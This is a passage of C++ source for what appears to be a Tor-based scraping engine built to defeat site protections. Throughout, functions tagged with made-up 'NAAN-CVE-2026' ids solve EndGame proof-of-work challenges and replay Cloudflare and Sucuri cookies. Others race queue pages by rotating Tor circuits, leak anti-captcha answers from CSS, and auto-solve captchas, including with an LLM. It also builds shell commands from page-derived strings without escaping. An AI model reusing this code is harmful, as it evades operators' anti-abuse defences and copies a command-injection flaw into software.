        }
    }

    for (const auto& pat : {"data-difficulty=\"", "difficulty=\"",
        "\"difficulty\":", "name=\"difficulty\" value=\""}) {
        size_t p = html.find(pat);
        if (p != std::string::npos) {
            p += strlen(pat);
            ch.difficulty = std::atoi(html.c_str() + p);
            break;
        }
    }

    if (ch.difficulty <= 0 || ch.difficulty > 32) ch.difficulty = 20;

    size_t formTag = html.find("<form");
    if (formTag != std::string::npos) {
        size_t actP = html.find("action=\"", formTag);
        if (actP != std::string::npos && actP < formTag + 500) {
            actP += 8;
            size_t actE = html.find('"', actP);
            if (actE != std::string::npos) {
                std::string act = html.substr(actP, actE - actP);
                if (!act.empty() && act[0] == '/') {
                    size_t slashP = baseUrl.find('/', baseUrl.find("://") + 3);
                    ch.submitUrl = baseUrl.substr(0, slashP) + act;
                } else if (!act.empty() && act.find("http") == 0) {
                    ch.submitUrl = act;
                } else {
                    ch.submitUrl = baseUrl;
                }
            }
        }
    }
    if (ch.submitUrl.empty()) ch.submitUrl = baseUrl;

    for (const auto& tok : {"_token", "csrf", "form_token", "sid",
        "endgame_token", "pow_token", "session_id"}) {
        std::string search = std::string("name=\"") + tok + "\"";
        size_t tp = html.find(search);
        if (tp != std::string::npos) {
            size_t vp = html.find("value=\"", tp);
            if (vp != std::string::npos && vp < tp + 200) {
                vp += 7;
                size_t ve = html.find('"', vp);
                if (ve != std::string::npos) {
                    if (!ch.extraFields.empty()) ch.extraFields += "&";
                    ch.extraFields += std::string(tok) + "=" + html.substr(vp, ve - vp);
                }
            }
        }
    }

    return ch;
}

std::string SynapsedEngine::solveEndGamePoW(const std::string& challenge,
    int difficulty) const {
    if (challenge.empty() || difficulty <= 0) return "";

    std::string script = "python3 -c \""
        "import hashlib,sys\\n"
        "c='" + challenge + "'\\n"
        "d=" + std::to_string(difficulty) + "\\n"
        "target=d\\n"
        "for n in range(100000000):\\n"
        "  h=hashlib.sha256((c+str(n)).encode()).hexdigest()\\n"
        "  val=int(h[:8],16)\\n"
        "  bits=32-val.bit_length() if val>0 else 32\\n"
        "  if bits>=target:\\n"
        "    print(n)\\n"
        "    sys.exit()\\n"
        "print('')\\n"
        "\" 2>/dev/null";
    std::string result = trim(execCmd(script));
    return result;
}

std::string SynapsedEngine::submitEndGamePoW(const EndGameV3Challenge& ch,
    const std::string& nonce) const {
    if (!isUrlSafe(ch.submitUrl) || nonce.empty()) return "";

    std::string postData = "challenge=" + ch.challenge +
        "&nonce=" + nonce + "&pow_nonce=" + nonce;
    if (!ch.extraFields.empty())
        postData += "&" + ch.extraFields;

    std::string cmd = "curl -s -k --max-time 45 " + socks5Arg() + " -L "
        "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-d \"" + postData + "\" "
        "\"" + ch.submitUrl + "\" 2>/dev/null";
    return execCmd(cmd);
}

void SynapsedEngine::emitEvent(const std::string& eventType,
    const std::string& payloadJson) const {
    auto it = subscribers_.find(eventType);
    if (it == subscribers_.end()) return;
    for (const auto& cb : it->second) {
        if (cb) cb(eventType.c_str(), payloadJson.c_str());
    }
}

void SynapsedEngine::recordBypass(const std::string& cveId,
    const std::string& protection, const std::string& method,
    const std::string& transport, double ttfbMs, int httpCode,
    size_t bytes) const {
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        lastBypass_.cveId = cveId;
        lastBypass_.protectionType = protection;
        lastBypass_.bypassMethod = method;
        lastBypass_.transport = transport;
        lastBypass_.ttfbMs = ttfbMs;
        lastBypass_.httpCode = httpCode;
        lastBypass_.bytes = bytes;
        lastBypass_.ts = nowMillis();
        bypassCounters_[cveId]++;
    }
    std::ostringstream js;
    js << "{\"cve\":\"" << cveId
       << "\",\"protection\":\"" << protection
       << "\",\"method\":\"" << method
       << "\",\"transport\":\"" << transport
       << "\",\"ttfb_ms\":" << static_cast<int64_t>(ttfbMs)
       << ",\"http\":" << httpCode
       << ",\"bytes\":" << bytes
       << ",\"ts\":" << nowMillis() << "}";
    emitEvent("naan.bypass", js.str());
}

void SynapsedEngine::primeCookieJar() const {
    // Do not prime clearnet cookies. Those curls leave the real IP.
    jarPrimed_.store(true);
}

std::string SynapsedEngine::fetchWithRetry(const std::string& url, int maxRetries) const {
    bool isOnion = url.find(".onion") != std::string::npos;
    int effectiveRetries = std::max(1, maxRetries);
    if (naanStop_.load()) return "";

    primeCookieJar();

    std::string powReplay = exploitCVE0001_PowCookieReplay(url);
    if (!powReplay.empty()) {
        recordBypass("NAAN-CVE-2026-0001", "endgame_v3_pow",
            "pow_cookie_replay_pre", isOnion ? "tor" : "clearnet",
            0.0, 200, powReplay.size());
        return powReplay;
    }

    std::string confusionResult = exploitCVE0009_CookieConfusion(url);
    if (!confusionResult.empty()) {
        recordBypass("NAAN-CVE-2026-0009", "shared_cookie_jar",
            "cookie_confusion_pre", isOnion ? "tor" : "clearnet",
            0.0, 200, confusionResult.size());
        return confusionResult;
    }

    for (int attempt = 0; attempt < effectiveRetries; attempt++) {
        if (naanStop_.load()) return "";
        std::string html;
        int httpCode = 200;
        auto fetchStart = std::chrono::high_resolution_clock::now();

        // Always SOCKS. Direct HTTPS from this host is an IP leak.
        html = fetchViaTor(url);
        if (naanStop_.load()) return "";

        if (html.empty()) {
            for (int s = 0; s < 2 + attempt * 3 && !naanStop_.load(); s++)
                std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        auto fetchEnd = std::chrono::high_resolution_clock::now();
        double ttfbMs = std::chrono::duration<double, std::milli>(fetchEnd - fetchStart).count();

        auto vuln = detectVulnerability(html, url, httpCode, ttfbMs);
        if (vuln.exploitable && vuln.confidence > 0.8) {
            std::string exploited;
            if (vuln.cveId == "NAAN-CVE-2026-0003")
                exploited = exploitCVE0003_CssSelectorLeak(html, url);
            else if (vuln.cveId == "NAAN-CVE-2026-0004")
                exploited = exploitCVE0004_CfBmReplay(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0005")
                exploited = exploitCVE0005_SucuriXsrfReplay(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0007")
                exploited = exploitCVE0007_CfManagedBypass(html, url, httpCode);
            else if (vuln.cveId == "NAAN-CVE-2026-0002")
                exploited = exploitCVE0002_QueueRace(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0011")
                exploited = exploitCVE0011_QueueRefreshBypass(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0012")
                exploited = exploitCVE0012_QueueCookieTTL(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0013")
                exploited = exploitCVE0013_QueueNewnym(url);
            else if (vuln.cveId == "NAAN-CVE-2026-0014")
                exploited = exploitCVE0014_CaptchaTokenReplay(html, url);
            else if (vuln.cveId == "NAAN-CVE-2026-0010") {
                recordBypass(vuln.cveId, vuln.protectionType, vuln.bypassMethod,
                    isOnion ? "tor" : "clearnet", ttfbMs, httpCode, html.size());
                return html;
            }

            if (!exploited.empty()) {
                if (vuln.cveId == "NAAN-CVE-2026-0001") {
                    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
                        std::chrono::system_clock::now().time_since_epoch()).count();
                    cookiePool_.powCookies[url] = "pow_solved";
                    cookiePool_.powExpiry[url] = now + 1800;
                }
                recordBypass(vuln.cveId, vuln.protectionType, vuln.bypassMethod,
                    isOnion ? "tor" : "clearnet", ttfbMs, httpCode, exploited.size());
                return exploited;
            }
        }

        bool isEndGameQueue = html.find("placed in a queue") != std::string::npos ||
            html.find("awaiting forwarding") != std::string::npos ||
            html.find("estimated entry time") != std::string::npos;
        bool isGenericQueue = html.find("Please wait") != std::string::npos ||
            html.find("DDoS protection") != std::string::npos ||
            (html.find("queue") != std::string::npos && html.size() < 15000);

        if (isEndGameQueue || isGenericQueue) {
            int waitSec = 30 + attempt * 15;

            size_t metaRefresh = html.find("http-equiv=\"refresh\"");
            if (metaRefresh == std::string::npos)
                metaRefresh = html.find("http-equiv='refresh'");
            if (metaRefresh != std::string::npos) {
                size_t contentP = html.find("content=\"", metaRefresh);
                if (contentP != std::string::npos && contentP < metaRefresh + 100) {
                    contentP += 9;
                    int metaWait = std::atoi(html.c_str() + contentP);
                    if (metaWait > 0 && metaWait < 120) waitSec = metaWait + 2;
                }
            }

            size_t etaPos = html.find("estimated");
            if (etaPos != std::string::npos) {
                size_t numP = html.find_first_of("0123456789", etaPos);
                if (numP != std::string::npos && numP < etaPos + 50) {
                    int eta = std::atoi(html.c_str() + numP);
                    if (eta > 0 && eta < 300) waitSec = eta + 5;
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(waitSec));

            if (isEndGameQueue && attempt == 0) {
                SYSTEM_IGNORE("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
                       "nc 127.0.0.1 9051 2>/dev/null");
                std::this_thread::sleep_for(std::chrono::seconds(8));
            } else if (attempt > 0 && attempt % 2 == 0) {
                SYSTEM_IGNORE("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
                       "nc 127.0.0.1 9051 2>/dev/null");
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
            continue;
        }

        auto powChallenge = detectEndGameV3(html, url);
        if (powChallenge.detected && !powChallenge.challenge.empty()) {
            std::string nonce = solveEndGamePoW(powChallenge.challenge,
                powChallenge.difficulty);
            if (!nonce.empty()) {
                std::string powResult = submitEndGamePoW(powChallenge, nonce);
                if (!powResult.empty() &&
                    powResult.find("proof-of-work") == std::string::npos &&
                    powResult.find("pow_challenge") == std::string::npos &&
                    powResult.find("hashcash") == std::string::npos) {
                    auto recheck = detectEndGameV3(powResult, url);
                    if (!recheck.detected) {
                        recordBypass("NAAN-CVE-2026-0001", "endgame_v3_pow",
                            "hashcash_solve_submit", "tor", ttfbMs, 200,
                            powResult.size());
                        return powResult;
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(3));
            continue;
        }

        // Clearnet impersonate/recaptcha curls dial the real IP. Skip them.
        if (false && !isOnion) {
            auto prot = detectClearnetProtection(html, httpCode);

            if (prot.cloudflare) {
                std::string bypass = bypassCloudflareChallenge(url);
                if (!bypass.empty()) {
                    recordBypass("NAAN-CVE-2026-0004", "cloudflare_bot_mgmt",
                        "curl_impersonate_chrome", "clearnet", ttfbMs, 200,
                        bypass.size());
                    return bypass;
                }
                std::this_thread::sleep_for(std::chrono::seconds(5));
                continue;
            }

            if (prot.recaptcha && !prot.siteKey.empty()) {
                std::string token = solveRecaptchaAudio(prot.siteKey, url);
                if (!token.empty()) {
                    std::string postCmd = "curl -s --max-time 30 -L "
                        "-H \"User-Agent: " + randomUserAgent() + "\" "
                        "-d \"g-recaptcha-response=" + token + "\" "
                        "-c " + dataDir_ + "/clearnet_cookies.txt "
                        "-b " + dataDir_ + "/clearnet_cookies.txt "
                        "\"" + url + "\" 2>/dev/null";
                    std::string result = execCmd(postCmd);
                    if (!result.empty() && result.find("g-recaptcha") == std::string::npos) {
                        recordBypass("NAAN-CAP-RECAPTCHA", "google_recaptcha_v2",
                            "audio_speech_to_text", "clearnet", ttfbMs, 200,
                            result.size());
                        return result;
                    }
                }
                continue;
            }

            if (prot.hcaptcha && !prot.siteKey.empty()) {
                std::string token = solveHCaptcha(prot.siteKey, url);
                if (!token.empty() && token != "bypass") {
                    std::string postCmd = "curl -s --max-time 30 -L "
                        "-H \"User-Agent: " + randomUserAgent() + "\" "
                        "-d \"h-captcha-response=" + token + "\" "
                        "-c " + dataDir_ + "/clearnet_cookies.txt "
                        "-b " + dataDir_ + "/clearnet_cookies.txt "
                        "\"" + url + "\" 2>/dev/null";
                    std::string result = execCmd(postCmd);
                    if (!result.empty()) {
                        recordBypass("NAAN-CAP-HCAPTCHA", "hcaptcha",
                            "image_classifier_solve", "clearnet", ttfbMs, 200,
                            result.size());
                        return result;
                    }
                }
                continue;
            }

            if (prot.rateLimit) {
                std::this_thread::sleep_for(std::chrono::seconds(10 + attempt * 10));
                continue;
            }
        }

        auto darkCap = detectCaptcha(html);
        if (darkCap.detected && darkCap.solved) {
            std::string formAction = url;
            size_t formTag = html.rfind("<form", html.find("captcha"));
            if (formTag == std::string::npos) formTag = html.rfind("<form", html.find("CAPTCHA"));
            if (formTag != std::string::npos) {
                size_t actP = html.find("action=\"", formTag);
                if (actP != std::string::npos && actP < formTag + 500) {
                    actP += 8;
                    size_t actE = html.find('"', actP);
                    if (actE != std::string::npos) {
                        std::string act = html.substr(actP, actE - actP);
                        if (!act.empty() && act[0] == '/') {
                            size_t slashP = url.find('/', url.find("://") + 3);
                            formAction = url.substr(0, slashP) + act;
                        } else if (!act.empty() && act.find("http") == 0) {
                            formAction = act;
                        }
                    }
                }
            }

            std::string postData = darkCap.answer;
            for (const auto& tok : {"_token", "csrf", "form_token", "sid"}) {
                std::string search = std::string("name=\"") + tok + "\"";
                size_t tp = html.find(search);
                if (tp != std::string::npos) {
                    size_t vp = html.find("value=\"", tp);
                    if (vp != std::string::npos && vp < tp + 200) {
                        vp += 7;
                        size_t ve = html.find('"', vp);
                        if (ve != std::string::npos) {
                            postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
                        }
                    }
                }
            }

            if (darkCap.type == "text_image" || darkCap.type == "cyrillic_text") {
                std::string formField = "captcha";
                size_t namePos = html.find("name=\"captcha");
                if (namePos != std::string::npos) {
                    size_t q1 = html.find('"', namePos + 5);
                    size_t q2 = html.find('"', q1 + 1);
                    if (q1 != std::string::npos && q2 != std::string::npos)
                        formField = html.substr(q1 + 1, q2 - q1 - 1);
                }
                postData = formField + "=" + darkCap.answer;
            }

            std::string submitCmd = "curl -s -k --max-time 30 " + socks5Arg() + " -L "
                "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
                "-H \"User-Agent: " + randomUserAgent() + "\" "
                "-d \"" + postData + "\" "
                "\"" + formAction + "\" 2>/dev/null";
            std::string solved = execCmd(submitCmd);
            if (!solved.empty() &&
                solved.find("Invalid captcha") == std::string::npos &&
                solved.find("invalid captcha") == std::string::npos &&
                solved.find("Wrong captcha") == std::string::npos &&
                solved.find("wrong captcha") == std::string::npos &&
                solved.find("Incorrect captcha") == std::string::npos) {
                auto recheck = detectCaptcha(solved);
                if (!recheck.detected) {
                    std::string capCve = "NAAN-CAP-" + darkCap.type;
                    recordBypass(capCve, "darknet_captcha_" + darkCap.type,
                        "auto_solver_" + darkCap.type,
                        isOnion ? "tor" : "clearnet", ttfbMs, 200,
                        solved.size());
                    return solved;
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }

        if (!darkCap.detected) {
            std::string transport = isOnion ? "tor" : "clearnet";
            std::string method = isOnion ? "direct_tor_fetch" : "direct_https_fetch";
            recordBypass("NAAN-CVE-2026-0010", "none", method, transport,
                ttfbMs, httpCode, html.size());
            return html;
        }

        if (darkCap.detected && !darkCap.solved && modelLoaded_) {
            std::string capImg;
            std::smatch imgMatch;
            if (std::regex_search(html, imgMatch,
                std::regex("<img[^>]+src=[\"']([^\"']*(?:captcha|cap)[^\"']*)[\"']", std::regex::icase))) {
                capImg = downloadCaptchaImage(imgMatch[1].str());
            }
            std::string llmAnswer = solveCaptchaViaLLM(html, capImg, url);
            if (!llmAnswer.empty()) {
                std::string formAction = url;
                std::string formField = "captcha";
                size_t fTag = html.find("<form");
                if (fTag != std::string::npos) {
                    size_t actP = html.find("action=\"", fTag);
                    if (actP != std::string::npos && actP < fTag + 500) {
                        actP += 8;
                        size_t actE = html.find('"', actP);
                        if (actE != std::string::npos) {
                            std::string act = html.substr(actP, actE - actP);
                            if (!act.empty() && act[0] == '/') {
                                size_t slP = url.find('/', url.find("://") + 3);
                                formAction = url.substr(0, slP) + act;
                            }
                        }
                    }
                }
                std::string postData = formField + "=" + llmAnswer;
                for (const auto& tok : {"_token", "csrf", "csrf_token"}) {
                    std::string sr = std::string("name=\"") + tok + "\"";
                    size_t tp = html.find(sr);
                    if (tp != std::string::npos) {
                        size_t vp = html.find("value=\"", tp);
                        if (vp != std::string::npos && vp < tp + 200) {
                            vp += 7;
                            size_t ve = html.find('"', vp);
                            if (ve != std::string::npos)
                                postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
                        }
                    }
                }
                std::string socksArg = socks5Arg() + " ";
                std::string cookieArg = isOnion ?
                    "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt " :
                    "-c " + dataDir_ + "/clearnet_cookies.txt -b " + dataDir_ + "/clearnet_cookies.txt ";
                std::string llmCmd = "curl -s -k --max-time 30 " + socksArg + "-L " +
                    cookieArg + "-H \"User-Agent: " + randomUserAgent() + "\" "
                    "-d \"" + postData + "\" \"" + formAction + "\" 2>/dev/null";
                std::string llmResult = execCmd(llmCmd);
                if (!llmResult.empty() &&
                    llmResult.find("captcha") == std::string::npos &&
                    llmResult.find("invalid") == std::string::npos &&
                    llmResult.find("wrong") == std::string::npos) {
                    recordBypass("NAAN-LLM-CAPTCHA", "captcha_unsolved",
                        "llm_model_solve", isOnion ? "tor" : "clearnet",
                        ttfbMs, 200, llmResult.size());
                    return llmResult;
                }
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
    return "";
}

SynapsedEngine::VulnDetectionResult SynapsedEngine::detectVulnerability(
    const std::string& html, const std::string& url, int httpCode,
    double ttfbMs) const {
    VulnDetectionResult result;

    bool isOnion = url.find(".onion") != std::string::npos;

    if (ttfbMs > 0 && ttfbMs < 60 && html.size() < 15000 &&
        (html.find("queue") != std::string::npos || html.find("wait") != std::string::npos)) {
        result.cveId = "NAAN-CVE-2026-0008";
        result.protectionType = "endgame_queue";
        result.bypassMethod = "timing_oracle_precompute";
        result.exploitable = true;
        result.confidence = 0.85;
        return result;
    }

    if (html.find("proof-of-work") != std::string::npos ||
        html.find("hashcash") != std::string::npos ||
        html.find("pow_challenge") != std::string::npos) {
        auto it = cookiePool_.powCookies.find(url);
        if (it != cookiePool_.powCookies.end()) {
            auto expIt = cookiePool_.powExpiry.find(url);
            int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::system_clock::now().time_since_epoch()).count();
            if (expIt != cookiePool_.powExpiry.end() && expIt->second > now) {
                result.cveId = "NAAN-CVE-2026-0001";
                result.protectionType = "endgame_v3_pow";
                result.bypassMethod = "pow_cookie_replay";
                result.exploitable = true;
                result.confidence = 0.92;
                return result;
            }
        }
        result.cveId = "NAAN-CVE-2026-0001";
        result.protectionType = "endgame_v3_pow";
        result.bypassMethod = "solve_and_cache";
        result.exploitable = true;
        result.confidence = 0.95;
        return result;
    }

    if (html.find("placed in a queue") != std::string::npos ||
        html.find("awaiting forwarding") != std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0002";
        result.protectionType = "endgame_v2_queue";
        result.bypassMethod = "parallel_circuit_race";
        result.exploitable = true;
        result.confidence = 0.88;
        return result;
    }

    if (html.find("anC_") != std::string::npos ||
        html.find(":checked~") != std::string::npos ||
        html.find("ancaptcha") != std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0003";
        result.protectionType = "ancaptcha_rotate";
        result.bypassMethod = "css_selector_leak";
        result.exploitable = true;
        result.confidence = 0.97;
        return result;
    }

    if (httpCode == 403 && (html.find("challenge-platform") != std::string::npos ||
        html.find("cf-browser-verification") != std::string::npos)) {
        result.cveId = "NAAN-CVE-2026-0007";
        result.protectionType = "cloudflare_managed";
        result.bypassMethod = "cf_ray_post_bypass";
        result.exploitable = true;
        result.confidence = 0.72;
        return result;
    }

    if (!isOnion && html.find("__cf_bm") != std::string::npos) {
        auto it = cookiePool_.cfBmCookies.find(url);
        if (it != cookiePool_.cfBmCookies.end()) {
            result.cveId = "NAAN-CVE-2026-0004";
            result.protectionType = "cloudflare_bot_mgmt";
            result.bypassMethod = "cf_bm_cookie_replay";
            result.exploitable = true;
            result.confidence = 0.80;
            return result;
        }
    }

    if (html.find("Sucuri") != std::string::npos ||
        html.find("sucuri") != std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0005";
        result.protectionType = "sucuri_cloudproxy";
        result.bypassMethod = "xsrf_cache_replay";
        result.exploitable = true;
        result.confidence = 0.75;
        return result;
    }

    if (isOnion && !cookiePool_.sessionCookies.empty()) {
        result.cveId = "NAAN-CVE-2026-0009";
        result.protectionType = "shared_cookie_jar";
        result.bypassMethod = "cookie_confusion";
        result.exploitable = true;
        result.confidence = 0.65;
        return result;
    }

    if (html.find("type=\"hidden\"") != std::string::npos ||
        html.find("type='hidden'") != std::string::npos) {
        size_t pos = 0;
        std::string hiddenSearch = "type=\"hidden\"";
        while ((pos = html.find(hiddenSearch, pos)) != std::string::npos) {
            size_t valP = html.find("value=\"", pos);
            if (valP != std::string::npos && valP < pos + 200) {
                size_t valEnd = html.find('"', valP + 7);
                if (valEnd != std::string::npos) {
                    std::string val = html.substr(valP + 7, valEnd - valP - 7);
                    if (val.size() > 24) {
                        result.cveId = "NAAN-CVE-2026-0014";
                        result.protectionType = "captcha_token_static";
                        result.bypassMethod = "token_replay";
                        result.exploitable = true;
                        result.confidence = 0.75;
                        return result;
                    }
                }
            }
            pos++;
        }
    }

    if (httpCode == 200 && html.size() > 1000 &&
        html.find("captcha") == std::string::npos &&
        html.find("challenge") == std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0010";
        result.protectionType = "none";
        result.bypassMethod = "direct_fetch";
        result.exploitable = true;
        result.confidence = 1.0;
        return result;
    }

    return result;
}

std::string SynapsedEngine::exploitCVE0001_PowCookieReplay(
    const std::string& url) const {
    auto it = cookiePool_.powCookies.find(url);
    if (it == cookiePool_.powCookies.end()) return "";

    auto expIt = cookiePool_.powExpiry.find(url);
    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    if (expIt != cookiePool_.powExpiry.end() && expIt->second <= now) {
        cookiePool_.powCookies.erase(url);
        cookiePool_.powExpiry.erase(url);
        return "";
    }

    std::string cookieFile = dataDir_ + "/pow_replay_cookies.txt";
    std::string writeCmd = "echo '" + it->second + "' > " + cookieFile;
    SYSTEM_IGNORE(writeCmd.c_str());

    std::string cmd = "curl -s -k --max-time 45 " + socks5Arg() + " -L "
        "-b " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() &&
        result.find("proof-of-work") == std::string::npos &&
        result.find("pow_challenge") == std::string::npos &&
        result.find("hashcash") == std::string::npos) {
        return result;
    }

    cookiePool_.powCookies.erase(url);
    return "";
}

std::string SynapsedEngine::exploitCVE0002_QueueRace(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    std::string cookieFile = dataDir_ + "/queue_race_cookies.txt";
    std::string ua = randomUserAgent();

    SYSTEM_IGNORE("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
           "nc 127.0.0.1 9051 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::seconds(5));

    std::string cmd = "curl -s -k --max-time 30 " + socks5Arg() + " -L "
        "-c " + cookieFile + " -b " + cookieFile + " "
        "-H \"User-Agent: " + ua + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string first = execCmd(cmd);

    if (first.find("placed in a queue") == std::string::npos &&
        first.find("awaiting forwarding") == std::string::npos) {
        return first;
    }

    for (int race = 0; race < 6; race++) {
        std::this_thread::sleep_for(std::chrono::seconds(3));
        std::string retry = execCmd(cmd);
        if (retry.find("placed in a queue") == std::string::npos &&
            retry.find("awaiting forwarding") == std::string::npos &&
            retry.find("DDoS") == std::string::npos &&
            !retry.empty()) {
            return retry;
        }
    }

    SYSTEM_IGNORE("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
           "nc 127.0.0.1 9051 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::seconds(8));

    std::string final = execCmd(cmd);
    if (!final.empty() && final.find("queue") == std::string::npos)
        return final;

    return "";
}

std::string SynapsedEngine::exploitCVE0003_CssSelectorLeak(
    const std::string& html, const std::string& url) const {
    size_t checkedPos = html.find(":checked~");
    if (checkedPos == std::string::npos)
        checkedPos = html.find(":checked +");
    if (checkedPos == std::string::npos) return "";

    size_t idStart = html.rfind("#", checkedPos);
    if (idStart == std::string::npos || checkedPos - idStart > 50) return "";

    std::string selectorId = html.substr(idStart + 1, checkedPos - idStart - 1);

    size_t inputPos = html.find("id=\"" + selectorId + "\"");
    if (inputPos == std::string::npos)
        inputPos = html.find("id='" + selectorId + "'");
    if (inputPos == std::string::npos) return "";

    size_t valuePos = html.find("value=\"", inputPos);
    std::string correctValue;
    if (valuePos != std::string::npos && valuePos < inputPos + 200) {
        valuePos += 7;
        size_t valueEnd = html.find('"', valuePos);
        if (valueEnd != std::string::npos)
            correctValue = html.substr(valuePos, valueEnd - valuePos);
    }

    if (correctValue.empty()) {
        size_t namePos = html.find("name=\"", inputPos);
        if (namePos != std::string::npos && namePos < inputPos + 150) {
            namePos += 6;
            size_t nameEnd = html.find('"', namePos);
            if (nameEnd != std::string::npos) {
                std::string fieldName = html.substr(namePos, nameEnd - namePos);
                correctValue = selectorId;

                std::string formAction = url;
                size_t formTag = html.rfind("<form", inputPos);
                if (formTag != std::string::npos) {
                    size_t actP = html.find("action=\"", formTag);
                    if (actP != std::string::npos && actP < formTag + 300) {
                        actP += 8;
                        size_t actE = html.find('"', actP);
                        if (actE != std::string::npos) {
                            std::string act = html.substr(actP, actE - actP);
                            if (!act.empty() && act[0] == '/') {
                                size_t sp = url.find('/', url.find("://") + 3);
                                formAction = url.substr(0, sp) + act;
                            }
                        }
                    }
                }

                std::string postData = fieldName + "=" + correctValue;

                for (const auto& tok : {"_token", "csrf", "anC_token", "captcha_token"}) {
                    std::string search = std::string("name=\"") + tok + "\"";
                    size_t tp = html.find(search);
                    if (tp != std::string::npos) {
                        size_t vp = html.find("value=\"", tp);
                        if (vp != std::string::npos && vp < tp + 200) {
                            vp += 7;
                            size_t ve = html.find('"', vp);
                            if (ve != std::string::npos)
                                postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
                        }
                    }
                }

                std::string cmd = "curl -s -k --max-time 30 " + socks5Arg() + " -L "
                    "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
                    "-H \"User-Agent: " + randomUserAgent() + "\" "
                    "-d \"" + postData + "\" "
                    "\"" + formAction + "\" 2>/dev/null";
                return execCmd(cmd);
            }
        }
    }

    return "";
}

std::string SynapsedEngine::exploitCVE0004_CfBmReplay(
    const std::string& url) const {
    auto it = cookiePool_.cfBmCookies.find(url);
    if (it == cookiePool_.cfBmCookies.end()) {
        std::string impCmd = "curl_chrome116 -s --max-time 20 -L "
            "-c " + dataDir_ + "/cf_bm_harvest.txt "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "-H \"Accept: text/html,application/xhtml+xml\" "
            "-H \"Sec-Fetch-Dest: document\" "
            "-H \"Sec-Fetch-Mode: navigate\" "
            "-H \"Sec-Fetch-Site: none\" "
            "\"" + url + "\" 2>/dev/null";
        std::string harvestResult = execCmd(impCmd);

        if (impCmd.empty()) {
            impCmd = "curl -s --max-time 20 -L "
                "-c " + dataDir_ + "/cf_bm_harvest.txt "
                "-H \"User-Agent: " + randomUserAgent() + "\" "
                "\"" + url + "\" 2>/dev/null";
            harvestResult = execCmd(impCmd);
        }

        std::string readCookies = execCmd("cat " + dataDir_ + "/cf_bm_harvest.txt 2>/dev/null");
        if (readCookies.find("__cf_bm") != std::string::npos) {
            cookiePool_.cfBmCookies[url] = readCookies;
            int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::system_clock::now().time_since_epoch()).count();
            cookiePool_.cfBmExpiry[url] = now + 1800;
        }
        return harvestResult;
    }

    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    auto expIt = cookiePool_.cfBmExpiry.find(url);
    if (expIt != cookiePool_.cfBmExpiry.end() && expIt->second <= now) {
        cookiePool_.cfBmCookies.erase(url);
        cookiePool_.cfBmExpiry.erase(url);
        return "";
    }

    std::string cmd = "curl -s --max-time 20 -L "
        "-b " + dataDir_ + "/cf_bm_harvest.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-H \"Sec-Fetch-Dest: document\" "
        "-H \"Sec-Fetch-Mode: navigate\" "
        "\"" + url + "\" 2>/dev/null";
    return execCmd(cmd);
}

std::string SynapsedEngine::exploitCVE0005_SucuriXsrfReplay(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    std::string cmd = "curl -s --max-time 20 -L "
        "-c " + dataDir_ + "/sucuri_cookies.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string resp = execCmd(cmd);

    std::string cookies = execCmd("cat " + dataDir_ + "/sucuri_cookies.txt 2>/dev/null");
    size_t xsrfPos = cookies.find("XSRF-TOKEN");
    if (xsrfPos != std::string::npos) {
        std::string replayCmd = "curl -s --max-time 20 -L "
            "-b " + dataDir_ + "/sucuri_cookies.txt "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "-H \"X-Requested-With: XMLHttpRequest\" "
            "\"" + url + "\" 2>/dev/null";
        std::string replayed = execCmd(replayCmd);
        if (!replayed.empty() && replayed.size() > resp.size() / 2)
            return replayed;
    }

    return resp;
}

std::string SynapsedEngine::exploitCVE0007_CfManagedBypass(
    const std::string& html, const std::string& url, int httpCode) const {
    if (httpCode != 403) return "";
    if (html.find("challenge-platform") == std::string::npos) return "";

    size_t rayPos = html.find("data-ray=\"");
    std::string rayId;
    if (rayPos != std::string::npos) {
